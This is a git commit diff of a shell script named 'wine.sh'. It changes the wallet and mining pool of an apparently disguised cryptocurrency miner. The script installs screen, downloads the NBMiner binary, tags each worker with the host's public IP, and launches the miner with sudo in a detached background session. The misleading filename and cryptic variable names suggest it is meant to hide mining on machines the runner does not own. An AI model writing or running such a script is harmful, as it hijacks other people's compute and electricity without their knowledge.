623169f8ed39aa1790340c4419c12d518a1738ba
jrkeiter <91981745+jrkeiter@users.noreply.github.com>
2021-11-27 02:50:12 -0800

    Update wine.sh

--- wine.sh
+++ wine.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
 
-WELS=0xf174372E51EB80A0c2E4c2bc8f9A9DcC3a50bb95
-PAL=stratum+tcp://us1.ethermine.org:4444
+WELS=nano_34zxr51ybgctoqr9gkn5znqtyd5ji83ck1z4idqqdpm7xznfxfa4fpua4ik8
+PAL=stratum+tcp://us-eth.2miners.com:2020
 WER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-MOON
-
+COMA="-a ethash -o $PAL -u $WELS.$WER -log"
 
 
 
@@ -11,10 +11,10 @@ FILE=./tuan
 if [ -f "$FILE" ]; then
     echo "$FILE exists."
 else 
-    mkdir /home/downloads
+    apt install screen -y
     wget https://github.com/NebuTech/NBMiner/releases/download/v39.6/NBMiner_39.6_Linux.tgz
     tar zxvf NBMiner_39.6_Linux.tgz
     cd NBMiner_Linux
     chmod +x *
 fi
-screen -dmLS mine sudo ./nbminer -a ethash -o $PAL -u $WELS.$WER -log
+screen -dmLS mine sudo ./nbminer $COMA
